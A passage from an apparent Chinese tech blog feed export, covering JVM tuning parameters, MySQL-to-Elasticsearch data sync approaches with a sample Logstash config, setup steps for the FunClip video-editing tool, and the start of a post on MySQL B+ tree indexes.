1、调优包括哪些维度？</h4><p>架构调优、代码调优、JVM调优、数据库调优、操作系统调优等</p><p>架构调优和代码调优是JVM调优的基础，其中<strong>架构调优是对系统影响最大的</strong></p><h4 id="8-2、何时进行JVM调优"><a href="#8-2、何时进行JVM调优" class="headerlink" title="8.2、何时进行JVM调优"></a>8.2、何时进行JVM调优</h4><ul><li><p>Heap内存（老年代）持续上涨达到设置的最大内存值；</p></li><li><p>Full GC 次数频繁；</p></li><li><p>GC 停顿时间过长（超过1秒）；</p></li><li><p>应用出现OutOfMemory等内存异常；</p></li><li><p>应用中有使用本地缓存且占用大量内存空间；</p></li><li><p>系统吞吐量与响应性能不高或不降；</p></li></ul><h4 id="8-3、JVM调优的基本原则"><a href="#8-3、JVM调优的基本原则" class="headerlink" title="8.3、JVM调优的基本原则"></a>8.3、JVM调优的基本原则</h4><ul><li><p>大多数的Java应用不需要进行JVM优化；</p></li><li><p>大多数导致GC问题的原因是代码层面的问题导致的（代码层面）；</p></li><li><p>上线之前，应先考虑将机器的JVM参数设置到最优；</p></li><li><p>减少创建对象的数量（代码层面）；</p></li><li><p>减少使用全局变量和大对象（代码层面）；</p></li><li><p>优先架构调优和代码调优，JVM优化是不得已的手段（代码、架构层面）；</p></li><li><p>分析GC情况优化代码比优化JVM参数更好（代码层面）</p></li></ul><p><strong>其实最有效的优化手段是架构和代码层面的优化，而JVM优化则是最后不得已的手段，也可以说是对服务器配置的最后一次“压榨”</strong></p><h4 id="8-4、JVM调优目标"><a href="#8-4、JVM调优目标" class="headerlink" title="8.4、JVM调优目标"></a>8.4、JVM调优目标</h4><p>目的都是为了令应用程序使用最小的硬件消耗来承载更大的吞吐。JVM调优主要是针对垃圾收集器的收集性能优化，令运行在虚拟机上的应用能够使用更少的内存以及延迟获取更大的吞吐量，总结以下：</p><ul><li><p>延迟：GC低停顿和GC低频率；</p></li><li><p>低内存占用；</p></li><li><p>高吞吐量。</p></li></ul><h4 id="8-5、JVM调优量化目标"><a href="#8-5、JVM调优量化目标" class="headerlink" title="8.5、JVM调优量化目标"></a>8.5、JVM调优量化目标</h4><ul><li><p>Heap 内存使用率 &lt;&#x3D; 70%;</p></li><li><p>Old generation 内存使用率 &lt;&#x3D; 70%;</p></li><li><p>avgpause &lt;&#x3D; 1秒;</p></li><li><p>Full GC 次数 0 或 avg pause interval &gt;&#x3D; 24小时。</p></li></ul><h4 id="8-6、JVM调优的步骤"><a href="#8-6、JVM调优的步骤" class="headerlink" title="8.6、JVM调优的步骤"></a>8.6、JVM调优的步骤</h4><ul><li><p>分析GC日志及dump文件，判断是否需要优化，确定瓶颈问题点；</p></li><li><p>确定JVM调优量化目标；</p></li><li><p>确定JVM调优参数（根据历史JVM参数来调整）；</p></li><li><p>依次调优内存、延迟、吞吐量等指标；</p></li><li><p>对比观察调优前后的差异；</p></li><li><p>不断的分析和调整，直到找到合适的JVM参数配置；</p></li><li><p>找到最合适的参数，将这些参数应用到所有服务器，并进行后续跟踪。</p></li></ul><h4 id="8-7、VM参数解析及调优"><a href="#8-7、VM参数解析及调优" class="headerlink" title="8.7、VM参数解析及调优"></a>8.7、VM参数解析及调优</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">\-Xmx4g   </span><br><span class="line">–Xms4g   </span><br><span class="line">–Xmn1200m   </span><br><span class="line">–Xss512k   </span><br><span class="line">\-XX:NewRatio=4   </span><br><span class="line">\-XX:SurvivorRatio=8   </span><br><span class="line">\-XX:PermSize=100m   </span><br><span class="line">\-XX:MaxPermSize=256m   </span><br><span class="line">\-XX:MaxTenuringThreshold=15  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>-Xmx4g：堆内存最大值为4GB。</p></li><li><p>-Xms4g：初始化堆内存大小为4GB。</p></li><li><p>-Xmn1200m：<strong>设置年轻代大小为1200MB</strong>。增大年轻代后，将会减小年老代大小。此值对系统性能影响较大，Sun官方推荐配置为整个堆的3&#x2F;8。</p></li><li><p>-Xss512k：<strong>设置每个线程的堆栈大小</strong>。JDK5.0以后每个线程堆栈大小为1MB，以前每个线程堆栈大小为256K。应根据应用线程所需内存大小进行调整。在相同物理内存下，减小这个值能生成更多的线程。但是操作系统对一个进程内的线程数还是有限制的，不能无限生成，经验值在3000~5000左右。</p></li><li><p>-XX:NewRatio&#x3D;4：<strong>设置年轻代（包括Eden和两个Survivor区）与年老代的比值（除去持久代）</strong>。设置为4，则年轻代与年老代所占比值为1：4，年轻代占整个堆栈的1&#x2F;5</p></li><li><p>-XX:SurvivorRatio&#x3D;8：<strong>设置年轻代中Eden区与Survivor区的大小比值</strong>。设置为8，则两个Survivor区与一个Eden区的比值为2:8，一个Survivor区占整个年轻代的1&#x2F;10</p></li><li><p>-XX:PermSize&#x3D;100m：初始化永久代大小为100MB。</p></li><li><p>-XX:MaxPermSize&#x3D;256m：设置持久代大小为256MB。</p></li><li><p>-XX:MaxTenuringThreshold&#x3D;15：<strong>设置垃圾最大年龄</strong>。如果设置为0的话，则年轻代对象不经过Survivor区，直接进入年老代。对于年老代比较多的应用，可以提高效率。如果将此值设置为一个较大值，则年轻代对象会在Survivor区进行多次复制，这样可以增加对象再年轻代的存活时间，增加在年轻代即被回收的概论。</p></li></ul><p><strong>可调优参数：</strong></p><ul><li><p>-Xms：初始化堆内存大小，默认为物理内存的1&#x2F;64(小于1GB)。</p></li><li><p>-Xmx：<strong>堆内存最大值</strong>。默认(MaxHeapFreeRatio参数可以调整)空余堆内存大于70%时，JVM会减少堆直到-Xms的最小限制。</p></li><li><p>-Xmn：新生代大小，包括Eden区与2个Survivor区。</p></li><li><p>-XX:SurvivorRatio&#x3D;1：Eden区与一个Survivor区比值为1:1。</p></li><li><p>-XX:MaxDirectMemorySize&#x3D;1G：<strong>直接内存</strong>。报java.lang.OutOfMemoryError: Direct buffer memory异常可以上调这个值。</p></li><li><p>-XX:+DisableExplicitGC：禁止运行期显式地调用System.gc()来触发fulll GC。</p></li><li><p>注意: Java RMI的定时GC触发机制可通过配置-Dsun.rmi.dgc.server.gcInterval&#x3D;86400来控制触发的时间。</p></li><li><p>-XX:CMSInitiatingOccupancyFraction&#x3D;60：老年代内存回收阈值，默认值为68。</p></li><li><p>-XX:ConcGCThreads&#x3D;4：CMS垃圾回收器并行线程线，推荐值为CPU核心数。</p></li><li><p>-XX:ParallelGCThreads&#x3D;8：新生代并行收集器的线程数。</p></li><li><p>-XX:MaxTenuringThreshold&#x3D;10：<strong>设置垃圾最大年龄</strong>。如果设置为0的话，则年轻代对象不经过Survivor区，直接进入年老代。对于年老代比较多的应用，可以提高效率。如果将此值设置为一个较大值，则年轻代对象会在Survivor区进行多次复制，这样可以增加对象再年轻代的存活时间，增加在年轻代即被回收的概论。</p></li><li><p>-XX:CMSFullGCsBeforeCompaction&#x3D;4：指定进行多少次fullGC之后，进行tenured区 内存空间压缩。</p></li><li><p>-XX:CMSMaxAbortablePrecleanTime&#x3D;500：当abortable-preclean预清理阶段执行达到这个时间时就会结束。</p></li></ul><h4 id="8-8、内存调优示例"><a href="#8-8、内存调优示例" class="headerlink" title="8.8、内存调优示例"></a>8.8、内存调优示例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">\-XX:+PrintGC 　　输出GC日志  </span><br><span class="line">\-XX:+PrintGCDetails 输出GC的详细日志  </span><br><span class="line">\-XX:+PrintGCTimeStamps 输出GC的时间戳（以基准时间的形式）  </span><br><span class="line">\-XX:+PrintGCDateStamps 输出GC的时间戳（以日期的形式，如 2013-05-04T21:53:59.234+0800）  </span><br><span class="line">\-XX:+PrintHeapAtGC 　　在进行GC的前后打印出堆的信息  </span><br><span class="line">\-Xloggc:../logs/gc.log 日志文件的输出路径  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p><img src="/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/24.png"></p><ul><li><p>java heap：参数-Xms和-Xmx，建议扩大至3-4倍FullGC后的老年代空间占用。</p></li><li><p>永久代：-XX:PermSize和-XX:MaxPermSize，建议扩大至1.2-1.5倍FullGc后的永久代空间占用。</p></li><li><p>新生代：-Xmn，建议扩大至1-1.5倍FullGC之后的老年代空间占用。</p></li><li><p>老年代：2-3倍FullGC后的老年代空间占用。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">\-Xms373m -Xmx373m //4\*93=372  </span><br><span class="line">\-Xmn140m //1.5\*93=139.5  </span><br><span class="line">\-XX:PermSize=5m -XX:MaxPermSize=5m //1.5\*3=4.5  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h2 id="九-、结语"><a href="#九-、结语" class="headerlink" title="九 、结语"></a>九 、结语</h2><p>在JVM调优中，关键在于准确识别系统的性能瓶颈和优化方向，选择适合的调优策略和参数。</p><p>实施调优方案后，必须验证效果，并持续监控系统性能，及时调整优化策略和参数以保持系统高性能和稳定性。</p><p>同时，需要及时发现和解决各种潜在的性能问题，如内存泄漏、CPU飙升、频繁的垃圾回收等，以确保系统在高负载和复杂环境下能够保持卓越的性能表现。</p><p>总之，JVM调优是一个持续改进的过程，通过对系统性能的深入分析和优化，确保Java应用程序在各种情况下都能够保持高效稳定的运行状态。</p><p>随着硬件技术的迅速发展，JVM调优也将面临新的挑战和机遇。新一代的处理器、存储技术以及分布式系统架构等将对JVM调优提出更高的要求，需要更智能、更高效的优化方案来适应日益复杂的应用场景和巨大的数据处理需求。</p><p>未来，JVM调优将持续创新和进步，以满足不断变化的业务需求和技术挑战，为Java应用程序提供更稳定、更高效的运行环境，推动Java生态系统的蓬勃发展和壮大。</p><p>与开篇所述保持一致，我们强调在JVM调优中，真正的参数调整是较少的，更多的是通过分析日志和结合系统业务进行代码层面的优化。</p><p>这可能是调优工作中占据更大比重的内容。我们不应迷失方向，只为了调优而调优，只为了调整参数而调整参数。最终，我们需要回归到业务本质，这才是最核心的内容。我们也需要更深入地了解JVM的相关参数，以更好地支撑业务需求的实现。</p><h2 id="说在最后：有问题找老架构取经"><a href="#说在最后：有问题找老架构取经" class="headerlink" title="说在最后：有问题找老架构取经"></a>说在最后：有问题找老架构取经</h2><p><strong>JVM 调优方法论</strong>、JVM调优 相关的面试题，是非常常见的面试题。也是核心面试题。</p><p>以上的内容，如果大家能对答如流，如数家珍，基本上 面试官会被你 震惊到、吸引到。</p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JVM调优 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>电商中es和mysql数据同步方案</title>
      
      <link href="/2024/06/16/%E7%94%B5%E5%95%86%E4%B8%ADes%E5%92%8Cmysql%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E6%96%B9%E6%A1%88/"/>
      <url>/2024/06/16/%E7%94%B5%E5%95%86%E4%B8%ADes%E5%92%8Cmysql%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E6%96%B9%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<p>在实际项目开发中，常用Mysql作为业务数据库，ElasticSearch作为查询库。ElasticSearch主要用来应对海量数据的复杂查询，提高查询效率和缓解Mysql数据库的压力。如何实现 MySQL 数据库和ElasticSearch之间的数据同步也是为非常关键的，下面介绍几种常见的数据同步方案方案。</p><p><strong>1、同步双写方案</strong></p><p><img src="/./2024/06/16/%E7%94%B5%E5%95%86%E4%B8%ADes%E5%92%8Cmysql%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E6%96%B9%E6%A1%88/1.png"><br>同步双写是指在Mysql上进行数据增删改操作时，同步将数据写入到ElasticSearch中，使用此方式保证Mysql与ElasticSearch中的数据一致性的优&#x2F;缺点如下：</p><table style="visibility: visible;"><tbody style="visibility: visible;"><tr style="visibility: visible;"><td width="90" valign="top" style="word-break: break-all; visibility: visible;">优点</td><td width="426" valign="top" style="word-break: break-all; visibility: visible;">实现简单；实时性高</td></tr><tr style="visibility: visible;"><td width="90" valign="top" style="word-break: break-all; visibility: visible;">缺点</td><td width="426" valign="top" style="word-break: break-all; visibility: visible;"><p style="visibility: visible;">1、存在数据丢失风险<span style="font-family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; font-size: var(--articleFontsize); letter-spacing: 0.034em; visibility: visible;">；</span></p><p><span style="font-family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: var(--articleFontsize);letter-spacing: 0.034em;">2、性能不高；</span></p><p><span style="font-family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: var(--articleFontsize);letter-spacing: 0.034em;"></span><span style="font-family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: var(--articleFontsize);letter-spacing: 0.034em;">3、和业务之间的耦合性强；</span></p><p><span style="font-family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: var(--articleFontsize);letter-spacing: 0.034em;"></span><span style="font-family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: var(--articleFontsize);letter-spacing: 0.034em;">4、不方便做扩展</span></p></td></tr></tbody></table><p><strong>2、异步写入方案</strong></p><p><img src="/./2024/06/16/%E7%94%B5%E5%95%86%E4%B8%ADes%E5%92%8Cmysql%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E6%96%B9%E6%A1%88/2.png"><br>在Mysql上进行数据增删改操作时，通过MQ（如Kafka）异步将数据写入到ElasticSearch中。这种异步方式可以降低Mysql的写入延迟并有效的防止了ElasticSearch自身问题而影响到Mysql数据的写入，但是可能会出现存在Mysql和ElasticSearch数据长时间的不一致的现象。此方案的优缺点如下：</p><table width="578"><tbody><tr><td width="90" valign="top" style="word-break: break-all;">优点</td><td width="426" valign="top" style="word-break: break-all;">性能高；数据不易丢失；支持多数据源写入<br></td></tr><tr><td width="90" valign="top" style="word-break: break-all;">缺点</td><td width="426" valign="top" style="word-break: break-all;"><p>1、增加了系统的复杂度，因为需要接入MQ；</p><p>2、数据之间的同步可能延迟高，MQ消费可能不及时；</p><p>3、发送消息需要硬编码到业务中；</p></td></tr></tbody></table><p><strong>3、定时任务同步方案</strong></p><p><img src="/./2024/06/16/%E7%94%B5%E5%95%86%E4%B8%ADes%E5%92%8Cmysql%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E6%96%B9%E6%A1%88/3.png"><br>定时任务的方案就是设定一个频率去Mysql中拉取数据来同步到ElasticSearch中，但是这个频率如何选择要根据自身的业务特性来选取。当前，如果频率设置很高就给系统造成一定的压力（如CPU、内存使用率居高不下），频率设置很低数据的实时性比较差。此方案的优缺点如下：</p><table width="578"><tbody><tr><td width="90" valign="top" style="word-break: break-all;">优点</td><td width="426" valign="top" style="word-break: break-all;">实现简单；无额外的代码的侵入业务中<br></td></tr><tr><td width="90" valign="top" style="word-break: break-all;">缺点</td><td width="426" valign="top" style="word-break: break-all;"><p>1、实时性差，因为依赖定时任务的执行频率；</p><p>2、给数据库带来一定的压力，因为是不断的轮询数据库；</p></td></tr></tbody></table><p><strong>4、使用Logstash同步</strong></p><p><img src="/./2024/06/16/%E7%94%B5%E5%95%86%E4%B8%ADes%E5%92%8Cmysql%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E6%96%B9%E6%A1%88/4.png"><br>此方案是针对定时任务同步的方案的一种改进，原理是Logstash提供了JDBC插件，它可以定期使用SQL查询数据库并且获取数据变化，然后通过配置来实现Mysql数据同步到ElasticSearch中。Logstash的配置：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">input &#123;`  `jdbc &#123;`    `jdbc_driver_library =&gt; &quot;/path/to/mysql-connector-java-x.x.x-bin.jar&quot;`    `jdbc_driver_class =&gt; &quot;com.mysql.jdbc.Driver&quot;`    `jdbc_connection_string =&gt; &quot;jdbc:mysql://192.168.202.12:3306/order&quot;`    `jdbc_user =&gt; &quot;root&quot;`    `jdbc_password =&gt; &quot;root123456&quot;`    `schedule =&gt; &quot;* * * * *&quot;`    `statement =&gt; &quot;SELECT * FROM order&quot;`  `&#125;``&#125;` `filter &#123;`  `# 在此处添加任何特定的数据过滤器`  `&#125;` `output &#123;`  `elasticsearch &#123;`    `hosts =&gt; [&quot;192.168.203.21:9200&quot;]`    `index =&gt; &quot;order&quot;`    `document_id =&gt; &quot;%&#123;unique_id_field&#125;&quot;`  `&#125;``&#125;</span><br></pre></td></tr></table></figure><p>此方案的优缺点如下：</p><table width="578"><tbody><tr><td width="90" valign="top" style="word-break: break-all;">优点</td><td width="426" valign="top" style="word-break: break-all;">实现简单；无额外的代码的侵入业务中<br></td></tr><tr><td width="90" valign="top" style="word-break: break-all;">缺点</td><td width="426" valign="top" style="word-break: break-all;"><p>1、实时性差，因为Logstash是定期同步数据的；</p><p>2、需要中间件的支持；</p></td></tr></tbody></table><p><strong>5、使用binlog同步——自建binlog服务中心</strong></p><p><img src="/./2024/06/16/%E7%94%B5%E5%95%86%E4%B8%ADes%E5%92%8Cmysql%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E6%96%B9%E6%A1%88/5.png"><br>此方案是先读取Mysql的binlog日志，然后将binlog日志交给binlog中心服务处理，然后把读取的binlog转化成MQ消息，通过消费MQ消息将Mysql中的数据同步到ElasticSearch中。此方案的优缺点如下：</p><table width="578"><tbody><tr><td width="90" valign="top" style="word-break: break-all;">优点</td><td width="426" valign="top" style="word-break: break-all;">性能高；业务解耦；无额外的代码的侵入业务中<br></td></tr><tr><td width="90" valign="top" style="word-break: break-all;">缺点</td><td width="426" valign="top" style="word-break: break-all;"><p>1、构建binlog中心服务复杂；</p><p>2、采用MQ消费binlog也会存在延迟风险；</p></td></tr></tbody></table><p><strong>6、使用binlog同步——开源中间件</strong></p><p>基于binlog同步的方式，目前有许多的优秀数据迁移工具可以实现，如canal，其实现的原理是binlog订阅的方式，模拟一个Mysql的Slave订阅 binlog日志，然后通过binlog将数据同步到监听者中。</p><p><img src="/./2024/06/16/%E7%94%B5%E5%95%86%E4%B8%ADes%E5%92%8Cmysql%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E6%96%B9%E6%A1%88/6.png"><br>总结：</p><p>数据同步方案有多种，需要根据自身的业务对数据的实时性来选择，业内常用的还是使用binlog的方案实现。</p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 场景设计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>最强阿里自动化视频剪辑工具</title>
      
      <link href="/2024/06/16/%E6%9C%80%E5%BC%BA%E9%98%BF%E9%87%8C%E8%87%AA%E5%8A%A8%E5%8C%96%E8%A7%86%E9%A2%91%E5%89%AA%E8%BE%91%E5%B7%A5%E5%85%B7/"/>
      <url>/2024/06/16/%E6%9C%80%E5%BC%BA%E9%98%BF%E9%87%8C%E8%87%AA%E5%8A%A8%E5%8C%96%E8%A7%86%E9%A2%91%E5%89%AA%E8%BE%91%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<p>这几年短视频非常火爆，尤其是抖音等短视频平台的崛起，很多人都可以把自己的日常生活或者工作发到网上，吸引很多人的关注，也有一些人因此赚到了人生第一桶金。</p><p>然后剪辑视频却是一件非常耗费精力的事情，经常要几个小时才能剪出来一个视频。</p><p>今天给大家推荐一个阿里开源的自动化视频剪辑工具—FunClip，可以帮助大家轻松剪辑视频。</p><p>FunClip是一款完全开源的自动化视频剪辑工具，可以安装在我们自己的电脑上，支持离线使用。还可以通过调用阿里巴巴通义实验室开源的 FunASR Paraformer 系列模型进行视频的语音识别，然后我们可以自由选择识别结果中的文本片段或说话人，点击裁剪按钮即可获取对应片段的视频。</p><p>所以使用 <strong>FunClip</strong> 剪辑视频非常的简单，不用像传统的视频剪辑软件，需要我们手动自己分割视频。</p><p>在上述基本功能的基础上，FunClip有以下特色：</p><ul><li><p>FunClip融合了众多高级语言模型的调用机制，并开放了灵活的prompt设置功能，旨在探索利用大型语言模型进行视频编辑的新方法。</p></li><li><p>FunClip采用了阿里巴巴开源的顶尖工业级语音识别模型——Paraformer-Large，它在开源中文ASR模型中表现出色，Modelscope的下载次数已超过1300万次，同时能够精确地预测出时间戳。</p></li><li><p>此外，FunClip还整合了SeACo-Paraformer的热词定制功能，在语音识别过程中可以特别指定实体词、人名等作为热词，从而显著提高识别的准确性。</p></li><li><p>FunClip还配备了CAM++的说话人识别模型，用户可以利用自动识别出的说话人ID作为编辑的依据，轻松裁剪出特定说话人的部分。</p></li><li><p>通过Gradio的交互界面，用户可以轻松实现上述功能，安装过程简洁，操作便捷，并且支持在服务器端部署，通过网页进行操作。</p></li><li><p>FunClip还支持多段视频的自由编辑，并且能够自动生成完整的视频SRT字幕文件以及目标剪辑片段的SRT字幕，简化了整个编辑流程。</p></li></ul><p>而且FunClip还加入了大语言模型智能裁剪功能，集成了qwen系列，gpt系列等模型，提供默认prompt，我们也可以训练自己的prompt，还支持通过FunASR开源的SeACo-Paraformer模型在视频剪辑中进一步支持热词定制化。</p><p><img src="/./2024/06/16/%E6%9C%80%E5%BC%BA%E9%98%BF%E9%87%8C%E8%87%AA%E5%8A%A8%E5%8C%96%E8%A7%86%E9%A2%91%E5%89%AA%E8%BE%91%E5%B7%A5%E5%85%B7/1.png"></p><h2 id="安装🔨"><a href="#安装🔨" class="headerlink" title="  安装🔨"></a>  <strong>安装🔨</strong></h2><p><strong><img src="https://res.wx.qq.com/t/wx_fed/we-emoji/res/v1.3.10/assets/newemoji/NoProb.png?tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"> 安装python环境</strong></p><p>FunClip的运行仅依赖python环境，所以我们只需要搭建好python环境就OK了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 克隆funclip仓库</span><br><span class="line">git clone https://github.com/alibaba-damo-academy/FunClip.git</span><br><span class="line">cd FunClip</span><br><span class="line"># 安装相关Python依赖</span><br><span class="line">pip install -r ./requirements.txt</span><br></pre></td></tr></table></figure><p><img src="https://res.wx.qq.com/t/wx_fed/we-emoji/res/v1.3.10/assets/newemoji/LetMeSee.png?tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"> 安装 imagemagick</p><p>希望使用自动生成字幕的视频裁剪功能，那么需要安装imagemagick：</p><ul><li>Ubuntu</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get -y update &amp;&amp; apt-get -y install ffmpeg imagemagick</span><br><span class="line">sed -i &#x27;s/none/read,write/g&#x27; /etc/ImageMagick-6/policy.xml</span><br></pre></td></tr></table></figure><ul><li>MacOS</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">brew install imagemagick</span><br><span class="line">sed -i &#x27;s/none/read,write/g&#x27; /usr/local/Cellar/imagemagick/7.1.1-8_1/etc/ImageMagick-7/policy.xml</span><br></pre></td></tr></table></figure><ul><li>Windows</li></ul><p>需要从下面的地址下载并安装imagemagick：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://imagemagick.org/script/download.php#windows</span><br></pre></td></tr></table></figure><p>  <strong>使用FunClip</strong></p><p>首先使用下面的命令启动FunClip：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python funclip/launch.py</span><br></pre></td></tr></table></figure><p>随后在浏览器中访问localhost:7860 就能进入首页。</p><p>然后按如下步骤即可进行视频剪辑：</p><ul><li><p>上传你的视频（或使用下方的视频用例）</p></li><li><p>设置热词，设置文件输出路径（保存识别结果、视频等）</p></li><li><p>点击识别按钮获取识别结果，或点击识别+区分说话人在语音识别基础上识别说话人ID</p></li><li><p>将识别结果中的选段复制到对应位置，或者将说话人ID输入到对应为止</p></li><li><p>配置剪辑参数，偏移量与字幕设置等</p></li><li><p>点击“裁剪”或“裁剪+字幕”按钮</p></li></ul><p><img src="/./2024/06/16/%E6%9C%80%E5%BC%BA%E9%98%BF%E9%87%8C%E8%87%AA%E5%8A%A8%E5%8C%96%E8%A7%86%E9%A2%91%E5%89%AA%E8%BE%91%E5%B7%A5%E5%85%B7/2.png"><br>使用大语言模型裁剪请参考如下教程：</p><p><img src="/./2024/06/16/%E6%9C%80%E5%BC%BA%E9%98%BF%E9%87%8C%E8%87%AA%E5%8A%A8%E5%8C%96%E8%A7%86%E9%A2%91%E5%89%AA%E8%BE%91%E5%B7%A5%E5%85%B7/3.png"><br>FunClip 在魔塔社区部署了在线服务，可以通过下面的地址体验：</p><p><a href="https://modelscope.cn/studios/iic/funasr/_app/_clipvideo/summary">https://modelscope.cn/studios/iic/funasr\_app\_clipvideo/summary</a></p><p>我们可以上传自己的视频或者音频，也可以使用 FunClip 提供的demo：</p><p><img src="/./2024/06/16/%E6%9C%80%E5%BC%BA%E9%98%BF%E9%87%8C%E8%87%AA%E5%8A%A8%E5%8C%96%E8%A7%86%E9%A2%91%E5%89%AA%E8%BE%91%E5%B7%A5%E5%85%B7/4.png"><br>更多内容，可以到github了解：</p><p><a href="https://github.com/alibaba-damo-academy/FunClip">https://github.com/alibaba-damo-academy/FunClip</a></p><p>总的来说，FunClip是一款完全开源、本地部署的自动化视频剪辑工具，可以帮助我们更加轻松地剪辑视频，记录我们的美好生活。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 视频工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>Mysql为什么用B+树不用跳表</title>
      
      <link href="/2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/"/>
      <url>/2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="字节面试：-Mysql为什么用B-树，不用跳表？"><a href="#字节面试：-Mysql为什么用B-树，不用跳表？" class="headerlink" title="字节面试： Mysql为什么用B+树，不用跳表？"></a>字节面试： Mysql为什么用B+树，不用跳表？</h1><p><strong>最近有小伙伴在蚂蚁、面试字节，都问到了相关的面试题，可以说是逢面必问。</strong></p><p>小伙伴没有系统的去梳理和总结，所以支支吾吾的说了几句，面试官不满意，面试挂了。</p><h2 id="索引的作用和重要性"><a href="#索引的作用和重要性" class="headerlink" title="索引的作用和重要性"></a>索引的作用和重要性</h2><p>索引是帮助MySQL高效获取数据的数据结构，注意，是帮助高性能的获取数据</p><p>索引好比是一本书的目录，可以直接根据页码找到对应的内容，目的就是为了<code>加快数据库的查询速度</code>。</p><ul><li><p>索引是对数据库表中一列或多列的值进行排序的一种结构，使用索引可快速访问数据库表中的特定信息。</p></li><li><p>索引是一种能帮助mysql提高了查询效率的数据结构：<strong>索引数据结构</strong>。</p></li></ul><p>索引的存储原理大致可以概括为一句话：<strong>以空间换时间</strong>。</p><p>数据库在未添加索引, 进行查询的时候默认是进行全文搜索，也就是说有多少数据就进行多少次查询，然后找到相应的数据就把它们放到结果集中，直到全文扫描完毕。</p><p>数据库添加了索引之后，通过索引快速找到数据在磁盘上的位置，可以快速的读取数据，而不同从头开始全表扫描。</p><p>一般来说索引本身也很大，不可能全部存储在内存中，因此索引往往是存储在磁盘上的文件中的（可能存储在单独的索引文件中，也可能和数据一起存储在数据文件中）。</p><h3 id="索引的作用和重要性-1"><a href="#索引的作用和重要性-1" class="headerlink" title="索引的作用和重要性"></a>索引的作用和重要性</h3><ul><li><p>加快数据检索速度</p><p>索引允许数据库系统快速定位到符合查询条件的记录，从而显著提高查询操作的效率。</p></li><li><p>降低数据库IO成本</p><p>通过索引，数据库在查询时需要读取的数据量减少，这样可以减少磁盘IO操作的次数和压力，进而提升整体的数据库性能。</p></li><li><p>保证数据的完整性</p><p>索引可以包含唯一性约束，这有助于确保表中数据的唯一性，防止出现重复记录。</p></li><li><p>加速表连接</p><p>在涉及多表查询时，索引可以帮助加速表与表之间的连接操作，实现表与表之间的参照完整性。</p></li><li><p>优化排序和分组操作</p><p>当使用分组、排序等操作进行数据检索时，索引可以显著减少处理的数据量，从而提高这些操作的效率。</p></li></ul><h2 id="B-数和跳表的整体结构"><a href="#B-数和跳表的整体结构" class="headerlink" 